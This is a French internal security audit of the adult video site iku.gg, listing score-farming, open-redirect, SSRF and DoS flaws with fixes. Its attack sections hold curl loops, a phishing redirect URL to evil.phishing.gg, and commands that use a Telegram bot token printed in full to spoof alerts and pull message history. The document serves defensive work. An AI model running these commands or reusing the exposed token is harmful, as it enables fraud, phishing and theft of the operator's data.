# iku.gg security audit — 2026-04-23

Scope : nouveaux angles d'attaque non couverts par le bug audit du matin (P0 B1/B3/B4 déjà corrigés dans `aeb3e7a`). Pentest style, focus OWASP Top 10 adapté à notre stack (Next.js 16 / NextAuth v5 / PostgreSQL / Stripe live / Coolify / Cloudflare).

## TL;DR

**1 CRITICAL, 3 HIGH, 6 MEDIUM, 5 LOW**

Le plus dangereux : `/api/score` accepte n'importe quel type d'événement défini dans `POINTS`, y compris `streak_100_bonus` (+500 pts) et `daily_quest` (+15 pts). Un user connecté peut farm **15 000 points/minute** et débloquer le coupon 30 % Stripe + tous les unlock-video gratuits.

Second plus dangereux : token Telegram du bot `@Addictives_bot` hardcodé en clair dans 4 fichiers committés au repo (commit history leak).

---

## CRITICAL

### V1. [src/app/api/score/route.ts:18-20, src/lib/gamification.ts:21-32] `/api/score` accepte les events bonus à haute valeur côté client

**Attack** :

```bash
# Session user obtient un cookie via /login
COOKIE="authjs.session-token=eyJ..."
for i in {1..30}; do
  curl -s "https://iku.gg/api/score" \
    -H "content-type: application/json" \
    -H "cookie: $COOKIE" \
    -d '{"event":"streak_100_bonus"}' &
done
# +500 × 30 = 15 000 pts en 60s. Loop par minute → 900 000 pts/h.
# À 15 000 pts le user atteint "Waifu Scholar" → 30% Stripe discount.
# À 50 000+ il débloque illimité de videos Pro (unlockCost moyen ≈ 50-200 pts).
```

La route `/api/score` prend `Object.keys(POINTS)` comme allowlist → inclut **streak_100_bonus (+500), streak_30_bonus (+200), streak_7_bonus (+50), video_of_day (+20), new_character (+10), favorite_add (+8), daily_quest (+15)**. Seuls `video_view` et `video_complete` sont capés par le `DAILY_VIEW_CAP` (100 pts/jour) via `PASSIVE_EVENTS` dans `recordScore`. Les autres events n'ont **aucun cap journalier**.

**Impact** :

- Unlock gratuit de toutes les vidéos Pro-gated (spend-points flow contourné à coût réel de $0)
- Coupon Stripe `STRIPE_COUPON_TIER_DISCOUNT` (30 %) appliqué sur Monthly/Yearly → perte revenue récurrente
- Pollution leaderboard / badges → discrédite la gamification pour les users légitimes
- DoS DB : chaque call fait 3-5 queries PG (getOrCreateUserStats + UPDATE user_stats + INSERT user_score_events + UPDATE badges), 30/min/user × 1000 users attaqués = 90k queries/min

**Fix** :

```ts
// src/app/api/score/route.ts
const ALLOWED_CLIENT_EVENTS = new Set<ScoreEventType>([
  "video_view", // capé par DAILY_VIEW_CAP
  "video_complete", // capé par DAILY_VIEW_CAP
  "favorite_add", // à caper aussi (voir V4)
  "share_click",
]);
// Les events "quest", "streak_*_bonus", "video_of_day", "new_character"
// doivent UNIQUEMENT être émis serveur-side (via recordScore direct
// depuis advanceDailyQuests / streak bonus calculé dans recordScore).
if (!ALLOWED_CLIENT_EVENTS.has(event as ScoreEventType)) {
  return NextResponse.json({ error: "forbidden event" }, { status: 403 });
}
```

Et vérifier que le call-site serveur de `advanceDailyQuests` appelle `recordScore({event:"daily_quest"})` sans passer par la route.

---

## HIGH

### V2. [scripts/tg-recap-signups.mjs:2, scripts/tg-recap-hilltop-zones.mjs:2, scripts/telegram-recap-2026-04-18.mjs:8, scripts/setup-revenue-cron.sh:46] Token Telegram bot committé en clair dans 4 fichiers

**Attack** :

```bash
# Token exposé : 8428448598:AAFwli73qAOBXrhMYqAGLfgpBjeM5M5Ehkw
curl -s "https://api.telegram.org/bot8428448598:AAFwli73qAOBXrhMYqAGLfgpBjeM5M5Ehkw/getMe"
# {"ok":true,"result":{"id":8428448598,"is_bot":true,"username":"Addictives_bot"}}

# Envoie spam à Sab (chat_id 5617056258 aussi hardcodé) :
curl -s "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d chat_id=5617056258 \
  -d text="faux alerte PG meltdown, reboot le serveur maintenant"
# → Sab SSH sur Hetzner en panique, tombe potentiellement dans un social-engineering suivi.

# Download every Telegram message history of the bot via getUpdates polling
curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates?offset=-1"
# exfiltre les recaps historiques (contenu ops iku.gg, métriques SEO/revenue confidentielles)
```

Le token apparaît aussi dans `scripts/setup-revenue-cron.sh` qui est un script d'installation — si ce fichier fuite (backup, fork, CI log public), un pentester peut spoofer des alertes ops et DoSer la réputation du monitoring.

**Impact** : Social engineering de l'opérateur (Sab) via alertes Telegram crédibles. Exfiltration des recaps historiques. Si l'attaquant fait beaucoup d'appels `/sendMessage` le bot peut être rate-limited par Telegram → alertes ops perdues.

**Fix** :

1. Révoquer le token immédiatement via BotFather (`/revoke` → nouveau token)
2. Purger des 4 fichiers :
   ```bash
   sed -i 's|"8428448598:AAFwli73qAOBXrhMYqAGLfgpBjeM5M5Ehkw"|process.env.TELEGRAM_BOT_TOKEN ?? ""|g' \
     scripts/tg-recap-signups.mjs \
     scripts/tg-recap-hilltop-zones.mjs \
     scripts/telegram-recap-2026-04-18.mjs
   # scripts/setup-revenue-cron.sh : remplacer par placeholder dans la template
   ```
3. `git filter-repo --replace-text` pour effacer de l'historique (repo privé mais qui sait qui y a accès en plus de theyknewio-prog flagué)
4. Rotate le CHAT_ID aussi si possible (moins critique, c'est juste un ID)

### V3. [src/app/login/login-form.tsx:11-37] Open redirect sur login via `?callbackUrl=`

**Attack** :

```
https://iku.gg/login?callbackUrl=https%3A%2F%2Fevil.phishing.gg%2Fgift-premium
```

1. Attaquant envoie un email phishing "Your iku.gg premium expired" avec ce lien
2. User voit vrai domaine iku.gg, se logue normalement
3. `router.push("https://evil.phishing.gg/gift-premium")` en Next.js **déclenche une navigation full-page** vers la destination externe (Next.js App Router `router.push` accepte les URLs absolues)
4. evil.phishing.gg imite iku.gg, demande re-saisie du mot de passe OU du numéro de carte Stripe → credential harvesting
5. L'Email source venait bien de iku.gg, l'URL dans la barre était iku.gg pendant le login → **phishing très convaincant**

**Impact** : Harvesting de creds / CB en piggyback sur la confiance iku.gg. Pas d'impact serveur direct mais très efficace sur un site adult où les users sont déjà mal à l'aise de vérifier les URLs trop attentivement.

**Fix** :

```ts
// src/app/login/login-form.tsx
const rawCallback = search.get("callbackUrl") || "/";
// Accept only same-origin paths (no full URLs, no protocol-relative)
const callbackUrl =
  rawCallback.startsWith("/") && !rawCallback.startsWith("//")
    ? rawCallback
    : "/";
```

Mêmes fix à appliquer dans `signup-form.tsx` (ligne 153, hardcodé "/profile" donc OK là), `pricing-client.tsx`, et surtout vérifier le passage `callbackUrl` au `signIn("discord", { callbackUrl })` qui lui va dans NextAuth's internal redirect — NextAuth v5 a un callback `redirect` qu'on n'override pas, donc il prend le default Auth.js qui autorise tout callbackUrl same-origin seulement. **Mais** notre `router.push(callbackUrl)` ligne 37 est **après** `signIn({ redirect: false })` donc c'est nous qui redirigeons → vulnérable.

### V4. [src/app/api/score/route.ts] Farming via favorite_add + bulk (chainage avec `/api/favorites`)

**Attack** :

```bash
# Étape 1 : bulk-add 500 favoris (1 call)
curl "https://iku.gg/api/favorites" -X POST -H "cookie: $COOKIE" \
  -d '{"bulk":["slug1","slug2",...,"slug500"]}'
# Nécessite email_verified=true mais après verification c'est libre.

# Étape 2 : pour chaque favori, fire event favorite_add +8 pts
for slug in slug1 slug2 ... slug500; do
  curl "https://iku.gg/api/score" -X POST -H "cookie: $COOKIE" \
    -d "{\"event\":\"favorite_add\",\"meta\":{\"slug\":\"$slug\"}}"
done
# 500 × 8 = 4000 pts en une minute (via rate limit 30/min il faut 17 min)
```

Combiné avec V1 (streak_100_bonus) c'est redondant, mais indépendamment ça marche même si V1 est fixé. Le bug fondamental : le serveur ne vérifie **pas** que `favorite_add` correspond à un vrai INSERT dans `user_favorites` — il fait juste confiance au client.

**Impact** : Même que V1 (farm Waifu Scholar + unlock).

**Fix** : Remplacer la route client-driven par un trigger serveur. Dans `/api/favorites` route POST (après un INSERT qui retourne `rowCount=1`), appeler `recordScore({userId, event:"favorite_add", meta:{slug}})` directement. Retirer "favorite_add" de l'allowlist client. Idem pour "share_click" (à vérifier que le track sert bien).

---

## MEDIUM

### V5. [src/app/api/video-stream/route.ts:289] `b-cdn.net` wildcard autorise tout tenant Bunny CDN (SSRF partielle)

**Attack** :

```bash
# Attaquant loue un compte Bunny CDN ($0/mois trial, prend 5 min), crée une pull zone "evil-zone.b-cdn.net".
# Upload un 10 Gbps loop MP4 ou un chunk qui se regenerate toutes les 2s.
for i in {1..1000}; do
  curl "https://iku.gg/api/video-stream?url=https://evil-zone.b-cdn.net/loop.mp4" &
done
# Chaque request force notre Hetzner à fetch 200 MB depuis Bunny → notre egress = 200 GB
# À 1000 concurrents × 30/min rate limit par IP × N IPs rotating = 1 TB/jour d'egress gratuit pour l'attaquant.
# Sur Hetzner 20 TB/mo, facile à saturer en 5 jours → bandwidth overages $$$.
```

Plus subtil : l'attaquant héberge du contenu pirate sur Bunny, force iku.gg à proxy → iku apparaît dans les logs DMCA comme source, pas Bunny.

**Déjà remonté** dans bug-audit-2026-04-23.md (B9) mais pas encore patché. Aussi la règle s'applique à l'allowlist `hembed.com`, `vintageporno.stream`, etc. — ces sont des domaines **tiers** avec sous-domaines non contrôlés par nous.

**Impact** : Bandwidth DoS, abuse, DMCA laundering.

**Fix** : Restreindre à `vz-*.b-cdn.net` (pull-zone porn3dx que nous utilisons). Ou passer par `resolved_urls` PG uniquement (si l'URL n'a pas été warmup par notre serveur → 404).

```ts
// Au lieu de "b-cdn.net" endsWith, regex strict :
if (/^vz-[a-z0-9-]+\.b-cdn\.net$/.test(parsed.hostname)) {
  /* ok */
}
```

### V6. [src/app/api/auth/resend-verification/route.ts:28-31] Clock-skew prevention leak + setInterval sans unref

L'audit bug avait déjà flagué (B8). Pas de vulnerability directe mais :

- `setInterval(cleanup, 10 * 60_000)` sans `.unref()` → Node n'exit pas en dev
- Pas d'impact sécurité direct, seulement DX.

### V7. [src/app/api/pro-status/route.ts:17-50] No rate limit + 2 PG queries par call + key par nothing

**Attack** :

```bash
# Anonymous user (pas de session) : pro-status ne fait qu'un auth() lookup puis return.
# Authenticated : fait `SELECT pro_status` + `SELECT score` + (si ?videoPk=) `SELECT 1 FROM user_unlocks`.
# = 3 queries par call, pas de rate limit, pas de cache.
for i in {1..10000}; do
  curl "https://iku.gg/api/pro-status?videoPk=$i" -H "cookie: $COOKIE" &
done
# 30 000 queries PG in ~30s. Avec PG tuning actuel (shared_buffers 2GB), ça tient
# mais si plusieurs users le font en parallèle : PG CPU 100% → auto-heal trigger.
```

**Impact** : DoS PG indirect. Pas critique (iku-postgres a tuning robuste + auto-heal depuis bug 2026-04-22), mais easy win.

**Fix** :

```ts
const limiter = createRateLimiter({
  name: "pro-status",
  max: 60,
  windowMs: 60_000,
});
// ou mieux : mettre le pro_status dans le JWT token (session.user.pro) et
// le rafraîchir seulement au login ou via un endpoint manuel.
```

### V8. [src/app/api/mark-dead/route.ts:21-48] Mass-DoS du catalogue (B2 from bug audit — toujours pas patché)

Déjà documenté dans `data/bug-audit-2026-04-23.md` B2 — pas corrigé. Rappel ici car c'est un vrai attack path. Botnet 1000 IPs → 20 000 vidéos/min marquées mortes → catalogue vidé silencieusement.

### V9. [src/app/api/resolve-video/route.ts:194-204 + src/app/api/video-stream/route.ts:254-290] Allowlist drift entre les 2 endpoints

**Attack** : /api/resolve-video a une allowlist de **8 domaines** (rule34video, hentaicity, hentaimama, hentai.tv, animeidhentai, watchhentai, hentaiworld, hentaigasm). /api/video-stream a **23 domaines** (inclut aussi sfmcompile, 3dhentai.tube, naughtyhentai, eporner, porn3dx, hembed.com, etc.).

Un attaquant qui veut abuser `/api/resolve-video` (yt-dlp) est contraint aux 8 premiers. Mais s'il connaît les deux et combine, il peut utiliser l'un pour forger des URLs que l'autre accepte ensuite. Ex : passer par `/api/video-stream?url=https://eporner.com/...` (pas dans resolve-video allowlist) → seulement rate limit IP gate.

**Impact** : Défense in-depth bypass. Mineur mais incohérent = piège futur.

**Fix** : Partager l'allowlist via une constante dans `src/lib/allowed-sources.ts`, importée par les deux routes.

### V10. [src/app/api/resolve/route.ts:4, 29] `PROXY_URL` fallback default `http://10.0.0.1:3001` — SSRF possible si prod env pas défini

**Attack** : Si `PROXY_URL` n'est pas définie en env, le code fetch vers `http://10.0.0.1:3001/resolve?slug=...`. Sur VPS Hetzner, 10.0.0.x = réseau interne Docker / Coolify. Si Coolify expose un service d'admin sur ce réseau, un slug crafté pourrait probe des services internes via le `slug` querystring (mais il est validé par regex `^[a-z0-9][a-z0-9-]{0,200}$`, donc pas d'injection d'URL).

Plus grave : si le PROXY_URL service interne répond n'importe quoi sans auth, la réponse est forwarded au user. Info leak du réseau Docker interne si le service fait un écho ou expose des métriques.

**Impact** : SSRF vers le réseau privé si env vide + PROXY_URL config incorrecte.

**Fix** : Remove default, fail hard si `PROXY_URL` pas défini :

```ts
if (!process.env.PROXY_URL) {
  return NextResponse.json(
    { error: "resolver not configured" },
    { status: 503 },
  );
}
```

### V11. [next.config.ts:8, middleware.ts:40] CSP avec `'unsafe-inline'` + `'unsafe-eval'` + `X-XSS-Protection` obsolete

**Attack** : Si un jour un XSS est trouvé (stored ou DOM-based), il s'exécute sans restriction car la CSP autorise `'unsafe-inline'` + `'unsafe-eval'`. L'entête `X-XSS-Protection: 1; mode=block` est **deprecated** (Chrome l'a supprimé en 2020, peut même créer des vulns dans quelques navigateurs vintage).

Accepté comme trade-off doc (ExoClick requiert `unsafe-eval`). Mais le `frame-ancestors 'none'` protège contre le clickjacking → c'est OK pour l'instant. Vigilance : si on re-enable les ads ExoClick (voir CLAUDE.md "ONLY HentaiPros 300x250 active"), la CSP reste full-open.

**Impact** : XSS amplifié, défense en profondeur faible. Pas exploitable en l'état (pas de XSS connu dans le code).

**Fix** :

- Retirer `X-XSS-Protection` (inutile)
- À terme, migrer vers CSP avec nonce (skill existe dans `superpowers:next-cache-components` ?) après avoir cadré avec ExoClick (ou retirer ExoClick si HentaiPros suffit).

---

## LOW

### V12. [src/app/api/health/route.ts] Leak uptime + memory → fingerprinting restart

```bash
curl https://iku.gg/api/health
# {"status":"ok","uptime":12345,"memory":{"heapUsedMB":850,...},"timestamp":"..."}
```

Un attaquant peut observer `uptime` pour savoir quand on redéploie (petit uptime après deploy → fenêtre pour exploit 0-day post-deploy avant que la stack chauffe). Aussi les MB consommés indiquent quand on approche un OOM.

**Fix** : Gate sur `Authorization: Bearer <HEALTH_TOKEN>` ou limit au réseau Coolify interne uniquement. Ou juste retourner `{"status":"ok"}` sans les détails. Uptime monitoring externe peut utiliser un endpoint sans détails.

### V13. [src/app/api/geo/route.ts] Leak des headers CF internes (`cf-ray`)

Renvoie `cf-ray` au client — révèle le datacenter Cloudflare qui sert la request. Pas exploitable directement mais aide à fingerprinting l'infra.

**Fix** : Enlever `cfRay` du response body (debug leftover).

### V14. [src/app/api/auth/reset-password/route.ts] Toujours pas de rate limit (bug B5)

Documenté dans bug-audit-2026-04-23.md B5, pas encore patché. Token 64-hex donc brute force inabordable, mais DoS possible (PG query par call).

**Fix** : Ajouter `createRateLimiter({ name: "reset-password", max: 10, windowMs: 3600_000 })`.

### V15. [src/app/api/profile/password/route.ts:47] `bcrypt.compare` sans rate limit → password-change brute-force via cookie volé

Bug B6 dans l'audit du matin, pas encore patché. Nécessite session valide donc faible impact direct, mais si un cookie fuite (via XSS hypothétique, malware client, ou nautilus public PC), un attaquant peut brute-forcer currentPassword à 150ms/try illimités.

**Fix** : `createRateLimiter({ name: "pwd-change", max: 5, windowMs: 3600_000 })` keyé sur `session.user.id`.

### V16. [src/app/api/history/route.ts:31-72] Bulk 500 slugs sans email-verify gate

Bug B7 — pas patché. Asymétrie avec `/api/favorites`. Spam signup → 500 slugs par minute dans user_history.

**Fix** : Copier le `getVerifyStatus` pattern de `/api/favorites` ligne 51-60 sur `/api/history` POST bulk.

---

## What's actually secure (so we know what not to panic about)

- **SQL injection**: zéro. Toutes les queries utilisent `$1, $2` parameterized, même les CTE dynamiques dans `content.ts` le font proprement. Aucune string interpolation avec user input.
- **Stripe webhook signature**: correcte (`constructEvent` avec tolérance 5min par défaut, bypass metadata checked, dedup via `stripe_events` table atomique).
- **Discord OAuth linking**: hardened — unverified Discord emails rejected, `byEmail.email_verified` checked avant auto-link (`auth.ts:109-128`).
- **Rate limit atomicity**: `createRateLimiter.consume` est atomique en Node mono-thread (pas d'`await` entre check et increment). Le commentaire dans le code est juste (CLAUDE.md le documente aussi).
- **Token generation**: `crypto.randomBytes(32).toString("hex")` → 256 bits, inexploitable par brute force.
- **Password hash**: bcrypt rounds=12 partout (adult/payment minimum). `password_reset_tokens` avec atomic claim via `UPDATE ... WHERE used_at IS NULL RETURNING` (race-free).
- **IP detection**: `getClientIp` utilise `x-real-ip` (Traefik, non-spoofable) puis `x-forwarded-for.pop()` (non-spoofable aussi). Jamais `x-forwarded-for[0]`.
- **Email enumeration**: `/forgot-password` retourne toujours la même réponse succès que le user existe ou non (`src/app/api/auth/forgot-password/route.ts:59`). Bon.
- **Stripe checkout user_id**: forcé `session.user.id`, metadata.user_id non lu depuis le body client. Bon.
- **.env.local gitignored**: `.gitignore` bloque `.env*` sauf `.env.example`. Les secrets ne sont pas dans le repo.
- **Prototype pollution**: aucun `Object.assign(obj, JSON.parse(userInput))` ni `lodash.merge` avec input client trouvé.
- **File path traversal**: aucun endpoint ne sert de fichier depuis l'input user. `fs.read*` / `path.resolve` n'apparaissent jamais avec un chemin user-controllable.
- **dangerouslySetInnerHTML**: toujours avec `JSON.stringify(...).replace(/</g, "\\u003c")` pour JSON-LD, ou `escapeHtml` pour les toasts. Blog content sanitized (strip script/on\*/javascript:).
- **Stripe live keys**: dans Coolify env uniquement, pas dans le repo.
- **Cloudflare DDoS/WAF**: devant l'origine. Masque IP (204.168.233.29 historique mais a priori changée via CF proxy — vérifier que les subdomains legacy n'exposent pas l'IP directe).

---

## Recommended immediate actions (ordered)

1. **V1 — Score farming**: restreindre `ALLOWED_EVENTS` dans `/api/score` à `video_view`, `video_complete`, `share_click` (retirer `streak_*`, `daily_quest`, `video_of_day`, `new_character`, `favorite_add`). Déplacer les events serveur-only dans leurs call-sites (`advanceDailyQuests`, `recordScore` interne après `/api/favorites` POST). **1h de travail, blocker revenue**.
2. **V2 — Rotate Telegram token**: `/revoke` sur @BotFather, remplacer par `process.env.TELEGRAM_BOT_TOKEN` dans les 4 fichiers, `git filter-repo` pour purger l'historique. **30 min**.
3. **V3 — Open redirect login**: guard `callbackUrl.startsWith("/") && !callbackUrl.startsWith("//")` dans `login-form.tsx:11`. **5 min**.
4. **V5 — b-cdn.net SSRF**: regex stricte `vz-[a-z0-9-]+\.b-cdn\.net` dans `/api/video-stream` allowlist. **10 min**.
5. **V7 — pro-status DoS**: ajouter rate limiter 60/min/IP. **5 min**.
6. **V8 — mark-dead DoS** (B2 du matin): soit accepter (≥3 reports distincts pour flag), soit désactiver en prod et faire ça via scanner serveur-side uniquement. **30 min**.
7. Tous les points LOW (V12-V16) en bulk — 30 min total — une fois la critical path sécurisée.

---

## Non-findings worth documenting

- **Stripe metadata tampering**: non exploitable (user_id forcé côté serveur dans `/api/stripe/checkout`, pas lu depuis body client).
- **JWT forging**: `AUTH_SECRET` 32-byte random base64 dans `.env.local`/Coolify, pas leak connue. Sauf si Coolify est compromis (v12 : admin UI sur port 8000 — **à vérifier** si exposé publiquement).
- **Session fixation**: NextAuth v5 regen les JWT à chaque signIn, pas d'issue.
- **NoSQL injection**: pas de NoSQL.
- **Prototype pollution**: scan négatif (pas de merge/assign avec user input).
- **Docker escape**: hors scope audit code, à vérifier côté infra (Coolify admin port exposé publiquement ?).
- **Cloudflare origin bypass**: si `204.168.233.29` est joignable directement (ports 80/443), un attaquant contourne la WAF. `ufw` ou firewall Hetzner doit allowlister uniquement les IP CF. **À vérifier côté Hetzner firewall** — pas dans le scope code audit.
